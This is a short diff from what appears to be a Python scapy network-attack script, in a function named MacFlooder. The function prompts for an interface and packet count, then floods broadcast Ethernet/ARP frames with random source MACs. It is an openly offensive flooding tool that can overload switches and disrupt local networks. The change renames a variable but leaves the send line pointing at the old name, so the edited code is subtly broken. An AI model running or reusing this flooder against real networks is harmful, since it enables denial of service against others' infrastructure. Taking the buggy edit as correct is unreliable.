@@ -386,7 +386,7 @@ def MacFlooder():
 	
     Iface = raw_input("Please Enter The Interface: ")
     count = int(raw_input("Please Enter The Number Of Packet: "))
-    Ether = Ether(src=RandMAC(),dst="ff:ff:ff:ff:ff:ff")
+    Ethernet = Ether(src=RandMAC(),dst="ff:ff:ff:ff:ff:ff")
     Arp = ARP(pdst="255.255.255.255", hwdst="ff:ff:ff:ff:ff:ff")
     sendp(Arp/Ether,iface=Iface,count=count,inter= .001)
 
